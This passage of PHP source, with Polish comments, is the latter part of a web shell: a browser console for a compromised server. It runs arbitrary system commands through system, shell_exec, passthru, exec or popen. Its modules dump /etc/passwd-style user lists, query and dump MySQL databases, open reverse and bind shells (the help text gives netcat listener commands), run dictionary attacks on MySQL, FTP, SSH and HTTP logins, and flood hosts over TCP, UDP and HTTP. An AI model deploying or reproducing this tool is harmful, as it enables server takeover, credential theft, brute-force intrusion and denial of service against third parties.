			return htmlspecialchars( sprintf( 'Nie można wgrać pliku "%s" na serwer', $this -> aArgv[2] ) );
		}

		ftp_close( $rFtp );

		return htmlspecialchars( sprintf( 'Plik "%s" został pomyślnie wgrany an FTP', $this -> aArgv[2] ) );
	}

	/**
	 * Komenda - etcpasswd
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandEtcPasswd()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
etcpasswd - Próba pobrania struktury pliku /etc/passwd za pomocą funkcji posix_getpwuid

	Użycie:
		etcpasswd

		etcpasswd [limit_dolny] [limit_górny]

	Przykład:

		etcpasswd
		etcpasswd 1000 2000
DATA;
		}

		/**
		 * Nie mozemy uruchomic tego na windowsie
		 */
		if( $this -> bWindows )
		{
			return 'Nie można uruchomić tego na windowsie';
		}

		/**
		 * funkcja posix_getpwuid musi istniec
		 */
		if( $this -> bFuncOwnerById )
		{
			return 'Funkcja "posix_getpwuid" nie istnieje';
		}

		/**
		 * Dolny zakres
		 */
		if( isset( $this -> aArgv[0] ) && ( ( $this -> aArgv[0] < 0 ) || ( $this -> aArgv[0] > 65534 ) ) )
		{
			return 'Błędny zakres dolny';
		}

		/**
		 * Gorny zakres
		 */
		if( isset( $this -> aArgv[1] ) && ( ( $this -> aArgv[0] > $this -> aArgv[1] ) || ( $this -> aArgv[1] > 65534 ) ) )
		{
			return 'Błędny zakres górny';
		}

		$sOutput = NULL;

		$iMin = ( isset( $this -> aArgv[0] ) ? $this -> aArgv[0] : 0 );
		$iMax = ( isset( $this -> aArgv[1] ) ? $this -> aArgv[1] : 65535 );

		/**
		 * Iteracja
		 */
		for( $i = $iMin; $i <= $iMax; $i++ )
		{
			if( ( $aUser = posix_getpwuid( $i ) ) !== FALSE)
			{
				/**
				 * Wzor jak dla pliku /etc/passwd
				 */
				$sOutput .= sprintf( "%s:%s:%d:%d:%s:%s:%s\r\n", $aUser['name'], $aUser['passwd'], $aUser['uid'], $aUser['gid'], $aUser['gecos'], $aUser['dir'], $aUser['shell'] );
			}
		}

		return $sOutput;
	}

	/**
	 * Komenda - mysql
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandMysql()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
mysql - Połączenie z bazą MySQL

	Użycie:
		mysql host:port login@hasło nazwa_bazy komenda

	Przykład:
		mysql localhost:3306 test@test mysql "SELECT 1"
DATA;
		}

		$aHost = $this -> getHost( $this -> aArgv[0] );

		/**
		 * Domyslny port to 3306
		 */
		if( $aHost[1] === 0 )
		{
			$aHost[1] = 3306;
		}

		/**
		 * login@pass
		 */
		list( $sUsername, $sPassword ) = explode( '@', $this -> aArgv[1], 2 );

		/**
		 * PDO jest wymagane
		 */
		if( ! extension_loaded( 'pdo' ) )
		{
			return 'Brak rozszerzenia PDO';
		}

		try
		{
			/**
			 * Polaczenie do bazy
			 */
			$oPdo = new PDO( sprintf( 'mysql:host=%s;port=%d;dbname=%s', $aHost[0], $aHost[1], $this -> aArgv[2] ), $sUsername, $sPassword );

			$oSql = $oPdo -> query( $this -> aArgv[3] );

			$aData = $oSql -> fetchAll( PDO::FETCH_ASSOC );

			$oSql -> closeCursor();

			if( $aData === array() )
			{
				return 'Brak wyników';
			}

			/**
			 * $aDataLength przechowuje dlugosc najdluzszego ciagu w danej kolumnie
			 */
			$aDataLength = $aData[0];

			/**
			 * Domyslnie dlugosc pola to dlugosc kolumny
			 */
			array_walk( $aDataLength, create_function( '& $sVal, $sKey', '$sVal = strlen( $sKey );' ) );

			/**
			 * Obliczanie dlugosci ciagu
			 */
			foreach( $aData as $aRow )
			{
				foreach( $aRow as $sColumn => $sValue )
				{
					if( ( $iLength = strlen( $sValue ) ) > $aDataLength[ $sColumn ] )
					{
						$aDataLength[ $sColumn ] = $iLength;
					}
				}
			}

			$sOutput = NULL;

			$sLines = str_repeat( '-', array_sum( $aDataLength ) + 1 + 3 * count( $aDataLength ) ) . "\r\n";

			$sOutput .= $sLines;
			/**
			 * Nazwy kolumn
			 */
			foreach( $aDataLength as $sColumn => $sValue )
			{
				$sOutput .= '| ' . str_pad( $sColumn, $aDataLength[ $sColumn ], ' ', STR_PAD_RIGHT ) . ' ';
			}
			$sOutput .= "|\r\n" . $sLines;

			/**
			 * Dane
			 */
			foreach( $aData as $aRow )
			{
				foreach( $aRow as $sColumn => $sValue )
				{
					$sOutput .= '| ' . str_pad( $sValue, $aDataLength[ $sColumn ], ' ', STR_PAD_RIGHT ) . ' ';
				}
				$sOutput .= "|\r\n";
			}

			return htmlspecialchars( $sOutput . $sLines );
		}
		/**
		 * Wyjatek
		 */
		catch( PDOException $oException )
		{
			return sprintf( 'Wystąpił błąd: %s', $oException -> getMessage() );
		}
	}

	/**
	 * Komenda - mysqldumper
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandMysqlDump()
	{
		/**
		 * Czy modul jest zaladowany
		 */
		if( ! class_exists( 'MysqlDumper' ) )
		{
			return 'mysqldump, mysqldumper, mysqlbackup - !!! moduł nie został załadowany';
		}

		/**
		 * Help
		 */
		if( ( $this -> iArgc < 3 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			$sVersion = MysqlDumper::VERSION;
			return <<<DATA
mysqldump, mysqldumper, mysqlbackup (v.{$sVersion}) - Kopia bazy danych MySQL

	Użycie:
		mysqldump host:port login@hasło nazwa_bazy [tabela1] [tabela2]

	Przykład:
		mysqldump localhost:3306 test@test mysql users
DATA;
		}

		$aHost = $this -> getHost( $this -> aArgv[0] );

		/**
		 * Domyslny port to 3306
		 */
		if( $aHost[1] === 0 )
		{
			$aHost[1] = 3306;
		}

		/**
		 * login@pass
		 */
		list( $sUsername, $sPassword ) = explode( '@', $this -> aArgv[1], 2 );

		/**
		 * PDO jest wymagane
		 */
		if( ! extension_loaded( 'pdo' ) )
		{
			return 'Brak rozszerzenia PDO';
		}

		try
		{
			/**
			 * Polaczenie do bazy
			 */
			$oPdo = new PDO( sprintf( 'mysql:host=%s;port=%d;dbname=%s', $aHost[0], $aHost[1], $this -> aArgv[2] ), $sUsername, $sPassword );

			$oDumper = new MysqlDumper();
			$oDumper -> setPdo( $oPdo )
				 -> setDownload( 1 )
				 -> setExtendedInsert( 1 );

			if( $this -> iArgc > 3 )
			{
				$oDumper -> setTables( array_slice( $this -> aArgv, 3 ) );
			}
			$oDumper -> get();
			exit ;

		}
		/**
		 * Wyjatek
		 */
		catch( PDOException $oException )
		{
			return sprintf( 'Wystąpił błąd: %s', $oException -> getMessage() );
		}
		catch( MysqlDumperException $oException )
		{
			return sprintf( 'Wystąpił błąd: %s', $oException -> getMessage() );
		}
	}

	/**
	 * Komenda - backconnect
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandBackConnect()
	{
		/**
		 * Czy modul jest zaladowany
		 */
		if( ! class_exists( 'BackConnect' ) )
		{
			return 'backconnect, bc - !!! moduł nie został załadowany';
		}

		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			$sVersion = BackConnect::VERSION;
			return <<<DATA
backconnect, bc (v.{$sVersion}) - Połączenie zwrotne

	Klient (shell) łączy się pod wskazany adres dając dostęp do powłoki

	Użycie:
		backconnect host:port

		komenda ":exit" zamyka połączenie

		najlepiej uruchomić w nowym oknie

	Przykład:
		backconnect localhost:6666

	NetCat:
		nc -vv -l -p 6666
DATA;
		}

		$aHost = $this -> getHost( $this -> aArgv[0] );

		try
		{
			ob_start();

			header( 'Content-Type: text/plain; charset=utf-8', TRUE );

			$oProxy = new BackConnect( $this );
			$oProxy -> setHost( $aHost[0] )
				-> setPort( $aHost[1] )
				-> get();
			ob_end_flush();
			exit ;
		}
		catch( BackConnectException $oException )
		{
			header( 'Content-Type: text/html; charset=utf-8', TRUE );
			return $oException -> getMessage();
		}
	}

	/**
	 * Komenda - bind
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandBind()
	{
		/**
		 * Czy modul jest zaladowany
		 */
		if( ! class_exists( 'Bind' ) )
		{
			return 'bind - !!! moduł nie został załadowany';
		}

		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			$sVersion = Bind::VERSION;
			return <<<DATA
bind (v.{$sVersion}) - Dostęp do powłoki na danym porcie

	Użycie:
		bind port

		komenda ":exit" zamyka połączenie

		najlepiej uruchomić w nowym oknie

	Przykład:
		bind 6666

	NetCat:
		nc host 6666
DATA;
		}

		try
		{
			ob_start();

			header( 'Content-Type: text/plain; charset=utf-8', TRUE );

			$oProxy = new Bind( $this );
			$oProxy -> setPort( $this -> aArgv[0] )
				-> get();
			ob_end_flush();
			exit ;
		}
		catch( BindException $oException )
		{
			header( 'Content-Type: text/html; charset=utf-8', TRUE );
			return $oException -> getMessage();
		}
	}

	/**
	 * Komenda - passwordrecovery
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandPasswordRecovery()
	{
		/**
		 * Czy modul jest zaladowany
		 */
		if( ! class_exists( 'PasswordRecovery' ) )
		{
			return 'passwordrecovery, pr - !!! moduł nie został załadowany';
		}

		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			$sVersion = PasswordRecovery::VERSION;
			return <<<DATA
passwordrecovery, pr (v.{$sVersion}) - Odzyskiwanie haseł, atak słownikowy na mysql, ftp, ssh2 oraz http

	Typ:
		mysql
		ftp
		ssh2
		http

	Użycie:
		passwordrecovery typ host:port uzytkownik|plik_z_uzytkownikami slownik
		passwordrecovery typ http://localhost/auth/ uzytkownik|plik_z_uzytkownikami slownik

	Przykład:
		passwordrecovery http http://localhost/auth/ tester /tmp/dic
		passwordrecovery mysql localhost:3306 tester /tmp/dic
DATA;
		}

		try
		{
			ob_start();

			header( 'Content-Type: text/plain; charset=utf-8', TRUE );

			$oPasswordRecovery = new PasswordRecovery();
			$oPasswordRecovery -> setHost( $this -> aArgv[1] )
					   -> setType( $this -> aArgv[0] )
					   -> setUsers( $this -> aArgv[2] )
					   -> setPasswords( $this -> aArgv[3] )
					   -> get();
			ob_end_flush();
			exit ;

		}
		catch( PasswordRecoveryException $oException )
		{
			header( 'Content-Type: text/html; charset=utf-8', TRUE );
			return $oException -> getMessage();
		}
	}

	/**
	 * Komenda - proxy
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandProxy()
	{
		/**
		 * Czy modul jest zaladowany
		 */
		if( ! class_exists( 'Proxy' ) )
		{
			return 'proxy - !!! moduł nie został załadowany';
		}

		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			$sVersion = Proxy::VERSION;
			return <<<DATA
proxy (v.{$sVersion}) - Proxy HTTP

	Proxy nie ma wielowątkowości, i ma poblemy z flushowaniem !!!
	Należy zmienić ilość polaczeń do serwera
		Opera:
			Narzedzia -> Preferencje -> Siec
			Maksymalna liczba polaczen z serweram: 2
			Maksymalna laczna liczba polaczen:     8

	Jeśli jedna osoba pobiera duży plik to następne żądania są zablokowane.
	Blokada jest zwolniona po tym jak użytkownik przerwie lub ściągnie plik
	Proxy te nie sluży do przeglądania youtuba, a wyłacznie do pobieranie małych plików tekstowych

	Aby zatrzymać serwer nalezy wyslac do niego polecenie ':exit' lub odwiedzić hosta 'command.exit'

	Użycie:
		proxy [opcja] port

	Opcje:
		-i - ignorowanie obrazków, jeśli wystąpi żądanie na plik .jpg .gif .png .ico .psd .bmp
		     zostanie wysłany plik graficzny gif 1x1 px

	Przykład:
		proxy 2222
		proxy -i 2222
DATA;
		}

		try
		{
			ob_start();

			header( 'Content-Type: text/plain; charset=utf-8', TRUE );

			$oProxy = new Proxy();
			$oProxy -> setPort( $this -> aArgv[0] )
				-> setNoImages( in_array( 'i', $this -> aOptv ) )
				-> get();
			ob_end_flush();
			exit ;
		}
		catch( ProxyException $oException )
		{
			header( 'Content-Type: text/html; charset=utf-8', TRUE );
			return $oException -> getMessage();
		}
	}

	/**
	 * Komenda - dos
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandDos()
	{
		/**
		 * Czy modul jest zaladowany
		 */
		if( ! class_exists( 'Dos' ) )
		{
			return 'dos - !!! moduł nie został załadowany';
		}

		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 3 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			$sVersion = Dos::VERSION;
			return <<<DATA
dos (v.{$sVersion}) - Denial Of Service - floodowanie tcp, udp i http

	Typ:
		tcp
		udp
		http

	Opcje:
		-n  wysłanie pakietu a następnie utworzenie nowego połączenia,
		    przy wysłaniu 100MB mamy utworzonych 100 połączeń, bez tej opcji wszystkie dane
		    zostaną wysłane przy pomocy jednego połączenia, dla 'http' połączenie będzie
		    typu 'Keep-Alive' jeżeli jest dostępne

	Użycie:
		dos http http://localhost/auth/ czas_trwania_ataku_w_sekundach
		dos typ host:port czas_trwania_ataku_w_sekundach

	Przykład:
		dos http http://localhost/auth/ 60
		dos tcp localhost:80 60
DATA;
		}

		try
		{
			ob_start();

			header( 'Content-Type: text/plain; charset=utf-8', TRUE );

			$oPasswordRecovery = new Dos();
			$oPasswordRecovery -> setHost( $this -> aArgv[1] )
					   -> setType( $this -> aArgv[0] )
					   -> setTime( $this -> aArgv[2] )
					   -> setNewConnection( in_array( 'n', $this -> aOptv ) )
					   -> get();
			ob_end_flush();
			exit ;

		}
		catch( DosException $oException )
		{
			header( 'Content-Type: text/html; charset=utf-8', TRUE );
			return $oException -> getMessage();
		}
	}

	/**
	 * Komenda - chmod
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandCr3d1ts()
	{
		return <<<DATA
Jak to się mówi: <strong>&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;</strong>

Domyślnie tego polecenia nie ma, ale udało Ci się je znaleźć.

Jakies sugestie, pytania ? Piszcie śmiało: <strong>Krzychu</strong> - <a href="m&#97;&#x69;&#108;&#x74;&#111;:&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;">&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;</a>

btw, sprawdziłeś komendę: '<strong>:g4m3</strong>'?

Changelog:
==========

2011-06-03 v0.2
----------
* Wsparcie dla CLI
* Shella rozszerzono o następujące komendy:
	<strong>ping</strong>
	<strong>mkdir</strong>
	<strong>cp</strong>
	<strong>mv</strong>
	<strong>modules</strong>
	<strong>chmod</strong>
	<strong>mysql</strong>
	<strong>mysqldump</strong>
	<strong>backconnect</strong>
	<strong>bind</strong>
	<strong>proxy</strong>
	<strong>dos</strong>
	<strong>passwordrecovery</strong>
	<strong>cr3d1ts</strong>
* możliwość wczytania danego modułu (Dos, PasswordRecovery, MysqlDump, Proxy, Bing, BackConnect)
* polecenie <strong>g4m3</strong> oraz <strong>cr3d1ts</strong> nie wyświetlają się w help'ie (&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;)
* <strong>php</strong> jest aliasem dla <strong>eval</strong>

2011-05-15 v0.1
---------------
* Pierwsza wersja skryptu, zawiera podstawowe komendy takie jak:
	<strong>echo</strong>
	<strong>ls</strong>
	<strong>cat</strong>
	<strong>eval</strong>
	<strong>remove</strong>
	<strong>bcat</strong>
	<strong>socketdownload</strong>
	<strong>ftpdownload</strong>
	<strong>download</strong>
	<strong>socketupload</strong>
	<strong>ftpupload</strong>
	<strong>etcpasswd</strong>
	<strong>game</strong>
	<strong>help</strong>
DATA;
	}

	/**
	 * Komenda - game
	 *
	 * @ignore
	 * @access private
	 * @return string
	 */
	private function getCommandG4m3()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
g4m3 - Gra z komputerem, wspaniała na samotne wieczory ;)

	Sprawdziłeś już komende <strong>:cr3d1ts</strong> ?

	Użycie:
		g4m3 cyfra_z_przedziału_0-9

		g4m3 cyfra_z_przedziału_0-9 [ilość_losowań]
DATA;
		}

		/**
		 * Jesli 'liczba' jest rowna 'x' to komputer sam losuje liczby
		 */
		if( ( $this -> aArgv[0] !== 'x' ) && ( ! ctype_digit( $this -> aArgv[0] ) || strlen( $this -> aArgv[0] ) !== 1 ) )
		{
			return 'Komputera nie oszukasz, zapoznaj się z zasadami gry';
		}

		/**
		 * Maksymalnie 1000 losowan
		 */
		if( isset( $this -> aArgv[1] ) && ( ! ctype_digit( $this -> aArgv[1] ) || ( $this -> aArgv[1] > 1000 ) ) )
		{
			return 'Komputera nie oszukasz, zapoznaj się z zasadami gry';
		}

		$iLoop = ( isset( $this -> aArgv[1] ) ? (int) $this -> aArgv[1] : 10 );

		$sOutput = NULL;

		$iWins  = 0;
		$iLoses = 0;

		$iDigit = (int) $this -> aArgv[0];

		$i = 0;
		do
		{
			if( $this -> aArgv[0] === 'x' )
			{
				$iDigit = mt_rand( 0, 9 );
			}

			if( ( $iNum = mt_rand( 0, 9 ) ) === $iDigit )
			{
				$sOutput .= sprintf( "<span class=\"green\">Wygrałeś</span>   Twoja liczba: <strong>%d</strong>, liczba komputera: <strong>%d</strong>\r\n", $iDigit, $iNum );
				++$iWins;
			}
			else
			{
				$sOutput .= sprintf( "<span class=\"red\">Przegrałeś</span> Twoja liczba: <strong>%d</strong>, liczba komputera: <strong>%d</strong>\r\n", $iDigit, $iNum );
				++$iLoses;
			}
		}
		while( ++$i < $iLoop );

		return sprintf( "<span class=\"red\">Przegrałeś</span>: <strong>%d</strong>, <span class=\"green\">Wygrałeś</span>: <strong>%d</strong>, Success rata: <strong>%.2f</strong> %%\r\n\r\n%s", $iLoses, $iWins, ( $iWins / $this -> aArgv[1] ) * 100, $sOutput );
	}

	/**
	 * Komenda - help
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandHelp()
	{
		$this -> aArgv[0] = 'help';
		$this -> iArgc    = 1;

		$oClass = new ReflectionClass( 'Shell' );
		$aMethods = $oClass -> getMethods();

		/**
		 * Naglowek komendy
		 */
		$aCommandsInfo = array();

		$sOutput = NULL;

		/**
		 * Wyszukiwanie metod zaczynających się od getCommand
		 */
		foreach( $aMethods as $oClass )
		{
			$sClass = $oClass -> getName();
			if( ( strncmp( $sClass, 'getCommand', 10 ) === 0 ) && ( $sClass !== 'getCommandHelp' ) && ( $sClass !== 'getCommandCr3d1ts' ) && ( $sClass !== 'getCommandG4m3' ) )
			{
				$sInfo = $this -> {$sClass}() . "\r\n\r\n\r\n\r\n";
				$aCommandsInfo[] = substr( $sInfo, 0, strpos( $sInfo, "\r\n" ) );
				$sOutput .= $sInfo;

			}
		}

		$iDashPos = 0;

		/**
		 * Pozycja znaku '-'
		 */
		$aCommandsPos = array();

		/**
		 * Wyrownanie znaku '-' tak by znajdowaly sie pod soba
		 */
		foreach( $aCommandsInfo as $sCommand )
		{
			if( $iDashPos < ( $iDashNewPos = strpos( $sCommand, '-' ) ) )
			{
				$iDashPos = $iDashNewPos;
			}
			$aCommandsPos[] = strlen( trim( substr( $sCommand, 0, $iDashNewPos - 1 ) ) );
		}
		--$iDashPos;

		foreach( $aCommandsInfo as $iKey => & $sCommand )
		{
			$sCommand = substr_replace( $sCommand, str_repeat( ' ', $iDashPos - $aCommandsPos[ $iKey ] ), $aCommandsPos[ $iKey ], 0 );
		}

		return substr( implode( "\r\n", $aCommandsInfo ) . "\r\n\r\n\r\n\r\n" . $sOutput, 0, -6 );
	}

	/**
	 * Domyslna akcja, dostep do konsoli
	 *
	 * @uses   Request
	 * @uses   Form
	 *
	 * @access public
	 * @return string
	 */
	public function getActionBrowser( $sCmd = NULL )
	{
		$bRaw = ( $sCmd !== NULL );

		/**
		 * Zawartosc konsoli
		 */
		$sConsole = NULL;

		/**
		 * Domyslna komenda to :ls -l sciezka_do_katalogu
		 */
		if( $sCmd === NULL )
		{
			if( PHP_SAPI === 'cli' )
			{
				/**
				 * Zmienne globalne to zlo ;), to powinno zostac przekazane
				 * jako parametr w konstruktorze ... ale coz ...
				 */
				$aArgv = $GLOBALS['argv'];
				array_shift( $aArgv );

				$sCmd = implode( $aArgv, ' ' );
			}
			else if( ! Request::getServer( 'REQUEST_METHOD' ) !== 'POST'  )
			{
				$sCmd = ':ls -l ' . dirname( __FILE__ );
			}
			else
			{
				$sCmd = (string) Request::getPost( 'cmd' );
			}
		}

		/**
		 * Komendy shella rozpoczynaja sie od znaku ':'
		 */
		if( substr( $sCmd, 0, 1 ) === ':' )
		{
			if( ( $iPos = strpos( $sCmd, ' ' ) - 1 ) !== -1 )
			{
				$this -> sCmd = substr( $sCmd, 1, $iPos );
			}
			else
			{
				$this -> sCmd = substr( $sCmd, 1 );
			}

			$this -> sArgv = ltrim( preg_replace( sprintf( '~^\:%s[\s+]?~', $this -> sCmd ), NULL, $sCmd ) );

			/**
			 * Rozdzielanie argumentow
			 *
			 * "sciezka do \"pliku\"" -> sciezka do "pliku"
			 */
			if( preg_match_all( '~\'(?:(?:\\\')|.*)\'|"(?:(?:\\")|(.*))"|[^ \r\n\t\'"]+~', $this -> sArgv, $aMatch ) );
			{
				/**
				 * Usuwanie koncowych znakow " oraz ', zamienianie \" na " i \' na '
				 */
				array_walk( $aMatch[0], array( $this, 'parseArgv' ) );

				$this -> aArgv = $aMatch[0];

				if( isset( $this -> aArgv[0] ) && substr( $this -> aArgv[0], 0, 1 ) === '-' )
				{
					$this -> aOptv = str_split( substr( $this -> aArgv[0], 1 ) );
					array_shift( $this -> aArgv );
					$this -> sArgv = ltrim( implode( ' ', $this -> aArgv ) );
				}
			}

			$this -> iArgc = count( $this -> aArgv );

			/**
			 *  Lista komend i aliasy
			 */
			switch( $this -> sCmd )
			{
				case 'echo':
					$sConsole = $this -> getCommandEcho();
					break ;
				case 'ping':
					$sConsole = $this -> getCommandPing();
					break ;
				case 'ls':
					$sConsole = $this -> getCommandLs();
					break ;
				case 'cat':
					$sConsole = $this -> getCommandCat();
					break ;
				case 'mkdir':
					$sConsole = $this -> getCommandMkdir();
					break ;
				case 'cp':
					$sConsole = $this -> getCommandCp();
					break ;
				case 'mv':
					$sConsole = $this -> getCommandMv();
					break ;
				case 'remove':
				case 'rm':
				case 'delete':
				case 'del':
					$sConsole = $this -> getCommandRemove();
					break ;
				case 'chmod':
					$sConsole = $this -> getCommandChmod();
					break ;
				case 'bcat':
				case 'b64':
					$sConsole = $this -> getCommandBCat();
					break ;
				case 'eval':
				case 'php':
					$sConsole = $this -> getCommandEval();
					break ;
				case 'modules':
					$sConsole = $this -> getCommandModules();
					break ;
				/**
				 * @see Line 170
				 */
				case $this -> sPhpInfo:
					$sConsole = $this -> getCommandPhpInfo();
					break ;
				case 'socketdownload':
				case 'socketdown':
				case 'socketget':
					$sConsole = $this -> getCommandSocketDownload();
					break ;
				case 'ftpdownload':
				case 'ftpdown':
				case 'ftpget':
					$sConsole = $this -> getCommandFtpDownload();
					break ;
				case 'download':
				case 'down':
				case 'get':
					$sConsole = $this -> getCommandDownload();
					break ;
				case 'socketupload':
				case 'socketup':
				case 'socketput':
					$sConsole = $this -> getCommandSocketUpload();
					break ;
				case 'ftpupload':
				case 'ftpup':
				case 'ftpput':
					$sConsole = $this -> getCommandFtpUpload();
					break ;
				case 'etcpasswd':
					$sConsole = $this -> getCommandEtcPasswd();
					break ;
				case 'mysql':
					$sConsole = $this -> getCommandMysql();
					break ;
				case 'mysqldump':
				case 'mysqldumper':
				case 'mysqlbackup':
					$sConsole = $this -> getCommandMysqlDump();
					break ;
				case 'backconnect':
				case 'bc':
					$sConsole = $this -> getCommandBackConnect();
					break ;
				case 'bind':
					$sConsole = $this -> getCommandBind();
					break ;
				case 'proxy':
					$sConsole = $this -> getCommandProxy();
					break ;
				case 'dos':
					$sConsole = $this -> getCommandDos();
					break ;
				case 'passwordrecovery':
				case 'pr':
					$sConsole = $this -> getCommandPasswordRecovery();
					break ;
				case 'cr3d1ts':
					$sConsole = $this -> getCommandCr3d1ts();
					break ;
				case 'g4m3':
					$sConsole = $this -> getCommandG4m3();
					break ;
				case 'help':
					$sConsole = $this -> getCommandHelp();
					break ;
				default :
					$sConsole = sprintf( 'Nie ma takiej komendy "%s"', $this -> sCmd );
			}
		}
		elseif( $sCmd === '' )
		{
			$sConsole = 'Wpisz <strong>:help</strong> by zobaczyć pomoc';
		}
		/**
		 * Wykonanie komendy systemowej
		 */
		else if( ! $this -> bSafeMode )
		{
			ob_start();
			if( ! in_array( 'system', $this -> aDisableFunctions ) )
			{
				system( $sCmd );
			}
			else if( ! in_array( 'shell_exec', $this -> aDisableFunctions ) )
			{
				echo shell_exec( $sCmd );
			}
			else if( ! in_array( 'passthru', $this -> aDisableFunctions ) )
			{
				passthru( $sCmd );
			}
			else if( ! in_array( 'exec', $this -> aDisableFunctions ) )
			{
				exec( $sCmd );
			}
			else if( ! in_array( 'popen', $this -> aDisableFunctions ) )
			{
				$rFp = popen( $sCmd, 'r' );
				while( ! feof( $rFp ) )
				{
					echo fread( $rFp, 1024 );
				}
			}
			else
			{
				echo 'Nic sobie nie porobisz, wszystkie funkcje systemowe są poblokowane !!!';
			}

			$sData = ob_get_contents();
			ob_clean();
			ob_end_flush();
			$sConsole = htmlspecialchars( $sData );
		}
		else
		{
			$sConsole = 'Safe mode jest włączone, więc <strong>exec</strong>, <strong>shell_exec</strong>, <strong>passthru</strong>, <strong>system</strong> i <strong>fopen</strong> nie zadziałają';
		}

		if( $bRaw || ( PHP_SAPI === 'cli' ) )
		{
			return strip_tags( $sConsole );
		}

		$sContent  = sprintf( '<pre id="console">%s</pre>', $sConsole );
		$sContent .= '<div>';
		$sContent .= Form::open();
		$sContent .= Form::inputText( 'cmd', $sCmd, TRUE, array( 'size' => 110, 'id' => 'cmd' ) );
		$sContent .= Form::inputSubmit( 'submit', 'Execute', array( 'id' => 'cmd-send' ) );
		$sContent .= Form::close();
		$sContent .= '</div>';

		return $this -> getContent( $sContent );
	}

	/**
	 * Pobieranie calosci strony
	 *
	 * @uses   Request
	 *
	 * @access private
	 * @return string
	 */
	private function getContent( $sData )
	{
		$sMenu = $this -> getMenu();
		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
		$sTitle = sprintf( 'Shell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
		$sVersion = self::VERSION;
return <<<DATA
<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset="utf-8"><style>
body{background-color:#eef7fb;color:#000;font-size:12px;font-family:sans-serif, Verdana, Tahoma, Arial;margin:10px;padding:0;}
a{color:#226c90;text-decoration:none;}
a:hover{color:#5a9cbb;text-decoration:underline;}
h1,h2,h3,h4,h5,h6{margin-top:10px;padding-bottom:5px;color:#054463;border-bottom:1px solid #d0d0d0;}
table{background-color:#fff;border:1px solid #e2ecf2;border-radius:20px;-moz-border-radius:20px;margin:auto;padding:6px;}
td{background-color:#f8f8f8;border-radius:5px;-moz-border-radius:5px;margin:0;padding:0 0 0 4px;}
th{color:#054463;font-size:14px;font-weight:700;background-color:#f2f2f2;border-radius:5px;-moz-border-radius:5px;margin:0;padding:2px;}
hr{margin-top:20px;background-color:#eef7fb;border:1px solid #eef7fb;}
div#body{text-align:center;border:3px solid #e2ecf2;border-radius:20px;-moz-border-radius:20px;min-width:940px;background-color:#fff;margin:0 auto;padding:8px 20px 10px;}
div#menu{text-align:left;margin:0 auto;}
div#bottom{margin:10px auto;}
div#content{padding-top:10px;margin:0 auto;}
pre#console{text-align:left;height:350px;min-height:350px;width:98%;font-size:11px;background-color:#f9f9f9;color:#000;border:3px solid #e2ecf2;overflow:scroll;margin:0 auto;padding:2px;}
input{border-radius:10px;-moz-border-radius:10px;border:1px solid #aaa;background-color:#fff;font-size:14px;padding:6px;}
input#cmd{width:88%;margin-top:10px;padding-left:10px;}
input#cmd:hover{background-color:#f1f1f1;}
input#cmd-send{margin-top:10px;margin-left:20px;}
.green{color:#55b855;font-weight:700;}
.red{color:#fb5555;font-weight:700;}</style>
</head>
<body>
</body>
<div id="body">
	<div id="menu">
		{$sMenu}
	</div>
	<div id="content">
		{$sData}
	</div>
	<div id="bottom">Strona wygenerowana w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>
</div>
</html>
DATA;
	}

	/**
	 * Wyswietlanie strony
	 *
	 * @access private
	 * @return string
	 */
	public function get()
	{
		$sData = $this -> getActionBrowser();

		echo $sData;

	}

	/**
	 * Oczyszczanie argumentow ze zbednych znakow
	 *
	 * @access private
	 * @param  string & $sVar Argument
	 * @return void
	 */
	private function parseArgv( & $sVar )
	{
		$sVar = strtr( $sVar, array
			(
				'\\\'' => '\'',
				'\\"'  => '"'
			)
		);

		if(    ( ( substr( $sVar, 0, 1 ) === '"' ) && ( substr( $sVar, -1 ) === '"' ) )
		    || ( ( substr( $sVar, 0, 1 ) === '\'' ) && ( substr( $sVar, -1 ) === '\'' ) )
		)
		{
			$sVar = substr( $sVar, 1, -1 );
		}
	}

}

/**
 * Wylaczanie wszystkich bufferow
 */
for( $i = 0; $i < ob_get_level(); $i++ )
{
	ob_end_clean();
}

$oShell = new Shell();
$oShell -> get();

exit ;